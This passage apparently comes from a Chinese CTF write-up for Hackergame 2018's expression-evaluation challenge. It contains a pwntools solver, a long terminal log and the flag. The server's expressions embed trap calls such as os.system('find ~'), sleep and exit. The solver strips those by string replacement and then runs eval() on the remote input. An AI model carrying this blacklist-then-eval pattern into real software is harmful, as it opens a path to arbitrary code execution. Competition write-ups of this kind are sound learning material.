!= None )))) 0 (( int ( int ( 89 != __import__ ( ' time ' ) . sleep ( 100 )) == 13 ) - ( 3 >> 88 )) & (( 29 + int ( __import__ ( ' os ' ) . system ( ' find ~ ' ) != 10 )) * ( 6 | int ( __import__ ( ' os ' ) . system ( ' find ~ ' ) != 15 )))) (( int ( int ( 89 != None ) == 13 ) - ( 3 >> 88 )) & (( 29 + int ( None != 10 )) * ( 6 | int ( None != 15 )))) 0 int ((( int ( print ( ' \\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a ' ) != 1 ) << 51 ) & ( 9 & int ( __import__ ( ' time ' ) . sleep ( 100 ) == 11 ))) < int (( 2 | 46 ) < ( 132 & 27 ))) int ((( int ( None != 1 ) << 51 ) & ( 9 & int ( None == 11 ))) < int (( 2 | 46 ) < ( 132 & 27 ))) 0 ((( 1 >> 28 ) ^ ( 1 - 2 )) + (( 2 ^ 11 ) & int ( 121 >= 2 ))) ((( 1 >> 28 ) ^ ( 1 - 2 )) + (( 2 ^ 11 ) & int ( 121 >= 2 ))) 0 int ((( 4 >> 80 ) - ( 84 | 109 )) >= (( 100 | 46 ) + ( 3 ^ 51 ))) int ((( 4 >> 80 ) - ( 84 | 109 )) >= (( 100 | 46 ) + ( 3 ^ 51 ))) 0 ((( 39 ** int ( 27 != print ( ' \\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a ' ))) | int ( 12 > 5 )) * (( int ( 3 == __import__ ( ' os ' ) . system ( ' find ~ ' )) >> 9 ) ^ ( 33 >> 22 ))) ((( 39 ** int ( 27 != None )) | int ( 12 > 5 )) * (( int ( 3 == None ) >> 9 ) ^ ( 33 >> 22 ))) 0 int ( int ( int ( int ( 111 == __import__ ( ' os ' ) . system ( ' find ~ ' )) < 5 ) < ( 12 | 122 )) <= (( 10 - 45 ) | ( int ( 88 != __import__ ( ' os ' ) . system ( ' find ~ ' )) + 1 ))) int ( int ( int ( int ( 111 == None ) < 5 ) < ( 12 | 122 )) <= (( 10 - 45 ) | ( int ( 88 != None ) + 1 ))) 0 ((( 3 + int ( 13 == __import__ ( ' time ' ) . sleep ( 100 ))) - ( int ( print ( ' \\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a ' ) == 3 ) - 12 )) * int (( 2 << 1 ) >= int ( 30 <= 2 ))) ((( 3 + int ( 13 == None )) - ( int ( None == 3 ) - 12 )) * int (( 2 << 1 ) >= int ( 30 <= 2 ))) 15 ((( int ( 1 != __import__ ( ' os ' ) . system ( ' find ~ ' )) + 60 ) + ( int ( 106 != __import__ ( ' os ' ) . system ( ' find ~ ' )) ** 39 )) * ( int ( 134 != int ( print ( ' \\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a ' ) == 24 )) - ( 1 << 22 ))) ((( int ( 1 != None ) + 60 ) + ( int ( 106 != None ) ** 39 )) * ( int ( 134 != int ( None == 24 )) - ( 1 << 22 ))) - 260046786 ((( 132 + 85 ) - ( 19 - int ( __import__ ( ' time ' ) . sleep ( 100 ) == 8 ))) | (( 64 & int ( __import__ ( ' time ' ) . sleep ( 100 ) != 126 )) - ( 4 >> 3 ))) ((( 132 + 85 ) - ( 19 - int ( None == 8 ))) | (( 64 & int ( None != 126 )) - ( 4 >> 3 ))) 198 (( int ( 4 < 117 ) * int ( 7 != 7 )) | ( int ( int ( print ( ' \\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a ' ) != 1 ) >= 144 ) ^ int ( 1 == int ( __import__ ( ' os ' ) . system ( ' find ~ ' ) != 1 )))) (( int ( 4 < 117 ) * int ( 7 != 7 )) | ( int ( int ( None != 1 ) >= 144 ) ^ int ( 1 == int ( None != 1 )))) 1 int ( int (( 88 >> 62 ) == ( 1 ^ int ( __import__ ( ' time ' ) . sleep ( 100 ) != 6 ))) > (( 7 - 7 ) * int ( 21 == 14 ))) int ( int (( 88 >> 62 ) == ( 1 ^ int ( None != 6 ))) > (( 7 - 7 ) * int ( 21 == 14 ))) 1 ((( 1 | 1 ) * int ( int ( 81 == __import__ ( ' time ' ) . sleep ( 100 )) != 13 )) & ( int ( 12 > int ( 1 != exit ())) * ( 3 - 30 ))) ((( 1 | 1 ) * int ( int ( 81 == None ) != 13 )) & ( int ( 12 > int ( 1 != None )) * ( 3 - 30 ))) 1 ( int (( 7 & int ( 33 == __import__ ( ' os ' ) . system ( ' find ~ ' ))) == ( 2 ** int ( 5 != print ( ' \\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a ' )))) * (( 14 >> 16 ) | ( int ( __import__ ( ' time ' ) . sleep ( 100 ) != 54 ) ^ 20 ))) ( int (( 7 & int ( 33 == None )) == ( 2 ** int ( 5 != None ))) * (( 14 >> 16 ) | ( int ( None != 54 ) ^ 20 ))) 0 ((( 115 >> 39 ) ^ int ( 15 != 2 )) * ( int ( 106 != 1 ) & ( 5 * 4 ))) ((( 115 >> 39 ) ^ int ( 15 != 2 )) * ( int ( 106 != 1 ) & ( 5 * 4 ))) 0 ((( 53 + 131 ) | int ( int ( 3 == __import__ ( ' os ' ) . system ( ' find ~ ' )) != 2 )) | (( 5 & 1 ) - ( int ( __import__ ( ' time ' ) . sleep ( 100 ) == 90 ) ^ 14 ))) ((( 53 + 131 ) | int ( int ( 3 == None ) != 2 )) | (( 5 & 1 ) - ( int ( None == 90 ) ^ 14 ))) - 5 ((( 28 ^ 4 ) * ( 1 + 10 )) ^ ( int ( 81 <= 18 ) | ( 56 ^ 1 ))) ((( 28 ^ 4 ) * ( 1 + 10 )) ^ ( int ( 81 <= 18 ) | ( 56 ^ 1 ))) 305 ((( 1 << 2 ) & ( int ( __import__ ( ' os ' ) . system ( ' find ~ ' ) == 4 ) | int ( print ( ' \\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a ' ) != 4 ))) | ( int ( 1 < 2 ) + ( 3 >> 25 ))) ((( 1 << 2 ) & ( int ( None == 4 ) | int ( None != 4 ))) | ( int ( 1 < 2 ) + ( 3 >> 25 ))) 1 (( int ( 2 != 6 ) ^ ( 41 + 140 )) - int (( 3 | 7 ) <= ( 1 ** 2 ))) (( int ( 2 != 6 ) ^ ( 41 + 140 )) - int (( 3 | 7 ) <= ( 1 ** 2 ))) 180 ( int ( int ( int ( 1 == exit ()) <= int ( exit () != 19 )) == ( 20 | 2 )) - int (( 8 * 48 ) != ( 1 | 5 ))) ( int ( int ( int ( 1 == None ) <= int ( None != 19 )) == ( 20 | 2 )) - int (( 8 * 48 ) != ( 1 | 5 ))) - 1 int ( int ( int ( 13 > 12 ) <= int ( 15 < 6 )) == (( 4 >> 13 ) ^ ( 20 + int ( 62 == __import__ ( ' time ' ) . sleep ( 100 ))))) int ( int ( int ( 13 > 12 ) <= int ( 15 < 6 )) == (( 4 >> 13 ) ^ ( 20 + int ( 62 == None )))) 0 (( int ( 4 < 1 ) - ( int ( __import__ ( ' os ' ) . system ( ' find ~ ' ) != 12 ) + 2 )) | (( 3 ^ 1 ) & int ( 43 <= 3 ))) (( int ( 4 < 1 ) - ( int ( None != 12 ) + 2 )) | (( 3 ^ 1 ) & int ( 43 <= 3 ))) - 3 ((( 1 | 94 ) ^ ( int ( print ( ' \\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a ' ) != 9 ) & 56 )) ^ (( 33 & 110 ) - ( 41 >> int ( print ( ' \\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a ' ) != 19 )))) ((( 1 | 94 ) ^ ( int ( None != 9 ) & 56 )) ^ (( 33 & 110 ) - ( 41 >> int ( None != 19 )))) 83 ( int (( 1 | int ( 4 == __import__ ( ' os ' ) . system ( ' find ~ ' ))) != ( 107 << 9 )) & (( 12 >> 2 ) + ( 23 + 1 ))) ( int (( 1 | int ( 4 == None )) != ( 107 << 9 )) & (( 12 >> 2 ) + ( 23 + 1 ))) 1 ((( 1 | 73 ) * ( 3 - 10 )) ^ ( int ( int ( __import__ ( ' os ' ) . system ( ' find ~ ' ) == 3 ) >= 29 ) * ( int ( 17 != __import__ ( ' time ' ) . sleep ( 100 )) | 2 ))) ((( 1 | 73 ) * ( 3 - 10 )) ^ ( int ( int ( None == 3 ) >= 29 ) * ( int ( 17 != None ) | 2 ))) - 511 ( int (( 74 | int ( 126 != print ( ' \\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a ' ))) > ( 108 + int ( 103 == exit ()))) | int (( 94 + 8 ) < ( 1 << 1 ))) ( int (( 74 | int ( 126 != None )) > ( 108 + int ( 103 == None ))) | int (( 94 + 8 ) < ( 1 << 1 ))) 0 ((( 1 >> int ( __import__ ( ' time ' ) . sleep ( 100 ) == 2 )) - ( 1 ** int ( 118 == __import__ ( ' os ' ) . system ( ' find ~ ' )))) | (( 6 * 1 ) + int ( 64 == 5 ))) ((( 1 >> int ( None == 2 )) - ( 1 ** int ( 118 == None ))) | (( 6 * 1 ) + int ( 64 == 5 ))) 6 ( int (( int ( 97 != print ( ' \\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a ' )) | 49 ) != int ( 72 == 39 )) & (( 3 << int ( 30 == __import__ ( ' os ' ) . system ( ' find ~ ' ))) * int ( int ( print ( ' \\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a ' ) != 1 ) != int ( 35 != __import__ ( ' os ' ) . system ( ' find ~ ' ))))) ( int (( int ( 97 != None ) | 49 ) != int ( 72 == 39 )) & (( 3 << int ( 30 == None )) * int ( int ( None != 1 ) != int ( 35 != None )))) 0 int ((( 55 >> 5 ) * ( 92 << 3 )) > ( int ( 1 != 29 ) ^ ( 1 + 76 ))) int ((( 55 >> 5 ) * ( 92 << 3 )) > ( int ( 1 != 29 ) ^ ( 1 + 76 ))) 1 ( int (( int ( __import__ ( ' time ' ) . sleep ( 100 ) != 2 ) ^ 1 ) > int ( 60 <= 145 )) ^ (( int ( print ( ' \\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a ' ) == 21 ) | int ( print ( ' \\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a ' ) == 1 )) | int ( 25 <= 1 ))) ( int (( int ( None != 2 ) ^ 1 ) > int ( 60 <= 145 )) ^ (( int ( None == 21 ) | int ( None == 1 )) | int ( 25 <= 1 ))) 0 ((( 5 + 6 ) ^ int ( 10 > 4 )) - (( 35 | int ( exit () != 9 )) ^ ( 28 - int ( 4 == exit ())))) ((( 5 + 6 ) ^ int ( 10 > 4 )) - (( 35 | int ( None != 9 )) ^ ( 28 - int ( 4 == None )))) - 53 ((( int ( __import__ ( ' time ' ) . sleep ( 100 ) != 4 ) - 51 ) ^ ( 105 >> int ( print ( ' \\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a ' ) == 117 ))) | (( int ( 11 == exit ()) + 31 ) + ( 12 ** 131 ))) ((( int ( None != 4 ) - 51 ) ^ ( 105 >> int ( None == 117 ))) | (( int ( 11 == None ) + 31 ) + ( 12 ** 131 ))) - 65 ((( int ( 18 == exit ()) * 101 ) - ( 87 | int ( 13 != __import__ ( ' time ' ) . sleep ( 100 )))) | (( int ( exit () == 38 ) >> 16 ) - ( 49 + int ( 2 != __import__ ( ' time ' ) . sleep ( 100 ))))) ((( int ( 18 == None ) * 101 ) - ( 87 | int ( 13 != None ))) | (( int ( None == 38 ) >> 16 ) - ( 49 + int ( 2 != None )))) - 17 int ((( 39 * 1 ) * ( 8 >> 5 )) == (( 25 | 92 ) | ( 4 ^ int ( 17 == __import__ ( ' os ' ) . system ( ' find ~ ' ))))) int ((( 39 * 1 ) * ( 8 >> 5 )) == (( 25 | 92 ) | ( 4 ^ int ( 17 == None )))) 0 int ((( int ( 1 != exit ()) + 2 ) & ( 42 - 30 )) > (( 5 | int ( 2 != __import__ ( ' time ' ) . sleep ( 100 ))) + ( 2 & 8 ))) int ((( int ( 1 != None ) + 2 ) & ( 42 - 30 )) > (( 5 | int ( 2 != None )) + ( 2 & 8 ))) 0 ((( 5 - 1 ) - ( 22 ** int ( __import__ ( ' os ' ) . system ( ' find ~ ' ) == 1 ))) | (( 28 & 1 ) * ( 3 & int ( 63 == __import__ ( ' os ' ) . system ( ' find ~ ' ))))) ((( 5 - 1 ) - ( 22 ** int ( None == 1 ))) | (( 28 & 1 ) * ( 3 & int ( 63 == None )))) 3 ((( int ( __import__ ( ' os ' ) . system ( ' find ~ ' ) != 127 ) | 8 ) | ( 14 ^ int ( __import__ ( ' time ' ) . sleep ( 100 ) != 12 ))) * ( int ( int ( 10 != print ( ' \\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a ' )) > 7 ) & int ( 5 < 31 ))) ((( int ( None != 127 ) | 8 ) | ( 14 ^ int ( None != 12 ))) * ( int ( int ( 10 != None ) > 7 ) & int ( 5 < 31 ))) 0 ( int (( 5 - 3 ) == ( 1 ^ 18 )) ^ ( int ( 7 != 75 ) | ( 85 >> 110 ))) ( int (( 5 - 3 ) == ( 1 ^ 18 )) ^ ( int ( 7 != 75 ) | ( 85 >> 110 ))) 1 ((( 2 << 2 ) - ( 51 ^ 14 )) - int (( int ( print ( ' \\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a ' ) != 4 ) ^ int ( print ( ' \\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a ' ) != 13 )) <= ( 55 - int ( 1 == exit ())))) ((( 2 << 2 ) - ( 51 ^ 14 )) - int (( int ( None != 4 ) ^ int ( None != 13 )) <= ( 55 - int ( 1 == None )))) - 54 ((( 106 * int ( 1 == __import__ ( ' time ' ) . sleep ( 100 ))) * int ( 3 != int ( print ( ' \\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a ' ) != 41 ))) + (( 5 ** 55 ) & ( 14 << 29 ))) ((( 106 * int ( 1 == None )) * int ( 3 != int ( None != 41 ))) + (( 5 ** 55 ) & ( 14 << 29 ))) 7516192768 ((( 8 - 4 ) + ( int ( 2 == print ( ' \\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a ' )) & 24 )) ^ (( 4 + 4 ) & ( 84 + 1 ))) ((( 8 - 4 ) + ( int ( 2 == None ) & 24 )) ^ (( 4 + 4 ) & ( 84 + 1 ))) 4 int ((( 21 ^ 58 ) + ( 13 * int ( __import__ ( ' os ' ) . system ( ' find ~ ' ) == 52 ))) <= (( 1 | 2 ) & int ( int ( 146 == exit ()) >= 3 ))) int ((( 21 ^ 58 ) + ( 13 * int ( None == 52 ))) <= (( 1 | 2 ) & int ( int ( 146 == None ) >= 3 ))) 0 ((( 20 << 2 ) & ( 20 << 18 )) + int (( 5 + int ( 63 == exit ())) >= ( 74 | 57 ))) ((( 20 << 2 ) & ( 20 << 18 )) + int (( 5 + int ( 63 == None )) >= ( 74 | 57 ))) 0 flag { ' Life_1s_sh0rt_use_PYTH0N ' * 1000 } flag { ' Life_1s_sh0rt_use_PYTH0N ' * 1000 } [ * ] Closed connection to 202 . 38 . 95 . 46 port 12009 Process finished with exit code 0","title":"\u732b\u54aa\u514b\u661f"},{"location":"ctf_writeup/hackergame_2018/python_simulator/#_1","text":"","title":"\u732b\u54aa\u514b\u661f"},{"location":"ctf_writeup/hackergame_2018/python_simulator/#_2","text":"SOURCE: https://hack2018.lug.ustc.edu.cn/#python_simulator \u901a\u77e5\uff1a\u5df2\u53d1\u5e03\u5907\u7528\u5730\u5740\u3002 \u4f17\u6240\u5468\u77e5\uff0c\u732b\u6015\u9ec4\u74dc \u4f60\u77e5\u9053\u732b\u54aa\u4e3a\u4ec0\u4e48\u6015\u9ec4\u74dc\u5417\uff1f \u6709\u4e00\u79cd\u8bf4\u6cd5\u662f\u8fd9\u662f\u732b\u5bf9\u86c7\u7684\u539f\u59cb\u6050\u60e7\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5982\u679c\u4e00\u4e2a\u4e1c\u897f\u8db3\u591f\u50cf\u86c7\uff0c\u90a3\u4e48\u732b\u54aa\u5c31\u4f1a\u6015\u5b83\u3002 \u8fdb\u4e00\u6b65\uff0c\u5982\u679c\u4f60\u8db3\u591f\u50cf\u86c7\uff0c\u732b\u5c31\u4f1a\u6015\u4f60\u3002 \u4e0b\u9762\u6211\u4eec\u6765\u626e\u6f14\u87d2\u86c7\uff08Python\uff09\u53bb\u5413\u732b\u3002 \u87d2\u86c7\u662f\u4e00\u79cd\u975e\u5e38\u5bb9\u6613\u4f7f\u7528\u7684\u7f16\u7a0b\u8bed\u8a00\uff0c\u8003\u9a8c\u4f60\u50cf\u4e0d\u50cf\u87d2\u86c7\u7684\u6807\u51c6\u5c31\u662f\u7ed9\u4f60\u4e00\u4e9b Python 3 \u8868\u8fbe\u5f0f\u3002\u5982\u679c\u4f60\u80fd\u6b63\u786e\u8ba1\u7b97\u51fa\u6765\uff0c\u4f60\u5c31\u901a\u8fc7\u4e86\u9a8c\u8bc1\u3002 \u8d76\u5feb\u4f7f\u7528\u547d\u4ee4 nc 202.38.95.46 12009 \u6765\u5f00\u59cb\u5427 \u5907\u7528\u5730\u5740\uff1anc 202.38.95.47 12009","title":"\u9898\u76ee"},{"location":"ctf_writeup/hackergame_2018/python_simulator/#_3","text":"nc\u540e\u53d1\u73b0\u662f\u9700\u8981\u572830\u79d2\u5185\u6c42\u89e3\u591a\u4e2a\u8868\u8fbe\u5f0f\u7684\u503c\uff0c\u51b3\u5b9a\u76f4\u63a5eval()\u89e3\u51b3\u3002\u968f\u540e\u53d1\u73b0\u6709\u8868\u8fbe\u5f0f\u5939\u5e26\u4e86\u4e00\u4e9b\u5e72\u6270\u7684\u51fd\u6570\uff0c\u9700\u8981\u5728\u8fd0\u7b97\u524d\u5148\u8fc7\u6ee4\u6389\u3002 \u8fd9\u91cc\u4f7f\u7528\u4e86pwntools\uff0c\u4e8b\u5b9e\u4e0a\u4e5f\u53ef\u4ee5\u4e0d\u7528\u5b83\uff0c\u5199\u597d\u4e4b\u540e\u5229\u7528nc\uff1a \u5c06\u4ee5\u4e0a\u4ee3\u7801\u4fdd\u5b58\u4e3a sol.py \u7136\u540e\u6267\u884c nc -e ./sol.py 202.38.95.46 12009 \u6216\u8005 socat exec:./sol.py tcp:202.38.95.46:12009 -- hackergame2018-writeups README.md at master \u00b7 ustclug hackergame2018-writeups \u8fd9\u91cc\u662f\u4ee3\u7801\uff0c\u73af\u5883\u662fWindows 10 + IntelliJ IDEA (with Python plugin) + Kali Linux (WSL)\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 from pwn import * def function_filter ( string ): if 'flag' in string : print ( string ) conn . close () exit ( 0 ) string = string . replace ( r \"print('\\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a')\" , 'None' ) string = string . replace ( 'exit()' , 'None' ) string = string . replace ( '__import__( \\' time \\' ).sleep(100)' , 'None' ) string = string . replace ( '__import__( \\' os \\' ).system( \\' find ~ \\' )' , 'None' ) return string conn = remote ( '202.38.95.46' , 12009 ) print ( conn . recvline ()) while True : expression = conn . recvline () print ( expression ) expression = function_filter ( expression ) print ( expression ) result = str ( eval ( expression )) + ' \\n ' conn . send ( result ) print ( result ) \u4e0b\u65b9\u662f\u7ec8\u7aef\u7684\u8bb0\u5f55\uff0c\u6e38\u5ba2\u6b62\u6b65\uff08\u6ed1\u7a3d.jpg\uff09\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 C :\\ Users \\ domain \\ AppData \\ Local \\ Microsoft \\ WindowsApps \\ kali . exe run \" export PYTHONUNBUFFERED=1 && export PYCHARM_MATPLOTLIB_PORT=63169 && export PYTHONPATH=/mnt/c/Users/domain/IdeaProjects/pwntools:/mnt/c/Users/domain/.IntelliJIdea2018.3/config/plugins/python/helpers/pycharm_matplotlib_backend && export PYCHARM_HOSTED=1 && export PYTHONIOENCODING=UTF-8 && cd /mnt/c/Users/domain/IdeaProjects/pwntools && /usr/bin/python /mnt/c/Users/domain/IdeaProjects/pwntools/main.py \" [ x ] Opening connection to 202 . 38 . 95 . 46 on port 12009 [ x ] Opening connection to 202 . 38 . 95 . 46 on port 12009 : Trying 202 . 38 . 95 . 46 [ + ] Opening connection to 202 . 38 . 95 . 46 on port 12009 : Done You have only 30 seconds ((( 117 ** 10 ) ^ ( 20 >> 4 )) * (( 112 & 56 ) + int ( 17 <= 45 ))) ((( 117 ** 10 ) ^ ( 20 >> 4 )) * (( 112 & 56 ) + int ( 17 <= 45 ))) 23553459107299463524952 ((( 76 + 113 ) * ( 4 - 7 )) - (( 3 & 5 ) * ( 120 - 10 ))) ((( 76 + 113 ) * ( 4 - 7 )) - (( 3 & 5 ) * ( 120 - 10 ))) - 677 ((( 19 ^ 58 ) & ( 25 - 2 )) & (( 2 ** 47 ) * ( 55 ^ 68 ))) ((( 19 ^ 58 ) & ( 25 - 2 )) & (( 2 ** 47 ) * ( 55 ^ 68 ))) 0 (( int ( 7 >= 11 ) + ( 4 ^ 19 )) & ( int ( 9 != 95 ) + ( 82 - 1 ))) (( int ( 7 >= 11 ) + ( 4 ^ 19 )) & ( int ( 9 != 95 ) + ( 82 - 1 ))) 18 ((( 59 | 17 ) - int ( 72 != 4 )) ^ (( 7 | 132 ) + ( 1 >> 4 ))) ((( 59 | 17 ) - int ( 72 != 4 )) ^ (( 7 | 132 ) + ( 1 >> 4 ))) 189 ((( 8 >> 9 ) | ( 1 & 21 )) | int (( 5 - 140 ) > ( 117 * 8 ))) ((( 8 >> 9 ) | ( 1 & 21 )) | int (( 5 - 140 ) > ( 117 * 8 ))) 1 (( int ( 9 == 39 ) + ( 2 << 42 )) * (( 2 ** 23 ) | int ( 85 != 34 ))) (( int ( 9 == 39 ) + ( 2 << 42 )) * (( 2 ** 23 ) | int ( 85 != 34 ))) 73786985090931228672 ( int (( 8 & 8 ) <= int ( 10 != 66 )) * int (( 23 * 1 ) < ( 112 ^ 71 ))) ( int (( 8 & 8 ) <= int ( 10 != 66 )) * int (( 23 * 1 ) < ( 112 ^ 71 ))) 0 (( int ( 15 == 14 ) + ( 87 >> 1 )) + (( 25 ** 111 ) + int ( 1 < 68 ))) (( int ( 15 == 14 ) + ( 87 >> 1 )) + (( 25 ** 111 ) + int ( 1 < 68 ))) 148368246027496855429269410461905580534702591150311640098121562356703253603825174359892483308928337501453556765440046361081982695395709015429019927978515669 ( int (( 10 + 110 ) != ( 82 << 89 )) * (( 23 | 23 ) | int ( 6 < 57 ))) ( int (( 10 + 110 ) != ( 82 << 89 )) * (( 23 | 23 ) | int ( 6 < 57 ))) 23 int (( int ( 1 >= 11 ) & ( 18 + 11 )) != int (( 6 | 4 ) >= int ( 116 > 4 ))) int (( int ( 1 >= 11 ) & ( 18 + 11 )) != int (( 6 | 4 ) >= int ( 116 > 4 ))) 1 (( int ( 140 > 4 ) | ( 50 ^ 49 )) - (( 7 + 16 ) ^ ( 23 + 110 ))) (( int ( 140 > 4 ) | ( 50 ^ 49 )) - (( 7 + 16 ) ^ ( 23 + 110 ))) - 143 int ( int (( 37 >> 56 ) != ( 24 * 21 )) >= (( 31 | 3 ) * ( 15 << 31 ))) int ( int (( 37 >> 56 ) != ( 24 * 21 )) >= (( 31 | 3 ) * ( 15 << 31 ))) 0 ((( 12 ** 1 ) - ( 1 * 43 )) ^ (( 138 & 5 ) ^ ( 86 * 59 ))) ((( 12 ** 1 ) - ( 1 * 43 )) ^ (( 138 & 5 ) ^ ( 86 * 59 ))) - 5069 int ( int (( 16 | 1 ) != ( 4 * 4 )) < (( 138 ** 39 ) + ( 2 | 79 ))) int ( int (( 16 | 1 ) != ( 4 * 4 )) < (( 138 ** 39 ) + ( 2 | 79 ))) 1 int ((( 39 ** 2 ) + ( 19 | 6 )) != ( int ( 6 <= 2 ) & ( 68 * 50 ))) int ((( 39 ** 2 ) + ( 19 | 6 )) != ( int ( 6 <= 2 ) & ( 68 * 50 ))) 1 ((( 37 - 2 ) - ( 3 >> 30 )) + (( 15 - 27 ) ^ ( 47 * 3 ))) ((( 37 - 2 ) - ( 3 >> 30 )) + (( 15 - 27 ) ^ ( 47 * 3 ))) - 100 ((( 23 + 100 ) | int ( 67 <= 135 )) - (( 97 - 19 ) - ( 2 | 9 ))) ((( 23 + 100 ) | int ( 67 <= 135 )) - (( 97 - 19 ) - ( 2 | 9 ))) 56 int (( int ( 48 <= 77 ) ^ ( 6 - 2 )) <= int (( 104 + 5 ) > ( 17 | 2 ))) int (( int ( 48 <= 77 ) ^ ( 6 - 2 )) <= int (( 104 + 5 ) > ( 17 | 2 ))) 0 (( int ( 15 != 34 ) * ( 68 ** 1 )) * (( 37 | 11 ) | ( 19 * 4 ))) (( int ( 15 != 34 ) * ( 68 ** 1 )) * (( 37 | 11 ) | ( 19 * 4 ))) 7548 ( int (( 15 - 9 ) <= ( 36 >> 45 )) ^ (( 15 | 101 ) - ( 29 << 21 ))) ( int (( 15 - 9 ) <= ( 36 >> 45 )) ^ (( 15 | 101 ) - ( 29 << 21 ))) - 60817297 ((( 2 << 64 ) * ( 47 & 9 )) - int (( 23 >> 1 ) > ( 49 & 1 ))) ((( 2 << 64 ) * ( 47 & 9 )) - int (( 23 >> 1 ) > ( 49 & 1 ))) 332041393326771929087 ((( 6 | 59 ) + ( 1 >> 8 )) | (( 1 ^ 2 ) + int ( 5 > 28 ))) ((( 6 | 59 ) + ( 1 >> 8 )) | (( 1 ^ 2 ) + int ( 5 > 28 ))) 63 ((( 2 * 21 ) + int ( 34 <= 65 )) & (( 106 ^ 2 ) - int ( 114 >= 5 ))) ((( 2 * 21 ) + int ( 34 <= 65 )) & (( 106 ^ 2 ) - int ( 114 >= 5 ))) 35 ((( 11 >> 45 ) + ( 1 + 7 )) ^ (( 2 & 5 ) - ( 22 * 29 ))) ((( 11 >> 45 ) + ( 1 + 7 )) ^ (( 2 & 5 ) - ( 22 * 29 ))) - 630 ((( 109 ** 1 ) + ( 1 + 38 )) - ( int ( 24 == 1 ) + ( 4 ^ 102 ))) ((( 109 ** 1 ) + ( 1 + 38 )) - ( int ( 24 == 1 ) + ( 4 ^ 102 ))) 50 ((( 56 << 4 ) + ( 1 * 3 )) - (( 1 + 2 ) * ( 2 << 1 ))) ((( 56 << 4 ) + ( 1 * 3 )) - (( 1 + 2 ) * ( 2 << 1 ))) 887 int ( int ( int ( 25 != 9 ) == ( 63 | 21 )) >= (( 7 ** 143 ) | ( 13 - 1 ))) int ( int ( int ( 25 != 9 ) == ( 63 | 21 )) >= (( 7 ** 143 ) | ( 13 - 1 ))) 0 ((( 10 << 2 ) | ( 1 ^ 79 )) - int (( 1 * 83 ) == ( 13 | 31 ))) ((( 10 << 2 ) | ( 1 ^ 79 )) - int (( 1 * 83 ) == ( 13 | 31 ))) 110 ((( 114 >> 1 ) ^ ( 4 | 13 )) | (( 3 ^ 9 ) ^ int ( 12 <= 1 ))) ((( 114 >> 1 ) ^ ( 4 | 13 )) | (( 3 ^ 9 ) ^ int ( 12 <= 1 ))) 62 (( 2342064000130989726458922265734505037 * 378101797641765074633697655 ) * ( 361209203089064608726475229 + 7405120403093238288678324066 )) (( 2342064000130989726458922265734505037 * 378101797641765074633697655 ) * ( 361209203089064608726475229 + 7405120403093238288678324066 )) 6877384713710666667629989990116701071335793976166078686609796185338000890158903577053294325 (( 113013673117091000778178561732 * 95568362858979441195778255590311 ) - ( 88442375602257996324134996385167433520 & 62868084756973658540 )) (( 113013673117091000778178561732 * 95568362858979441195778255590311 ) - ( 88442375602257996324134996385167433520 & 62868084756973658540 )) 10800531720480242930912425663531210138715873070864972025722044 (( 145936223963731625770596791 + 185713060458974767541446220 ) + ( 4222634439223833111865710 * 3392216678742463229433662535331800569 )) (( 145936223963731625770596791 + 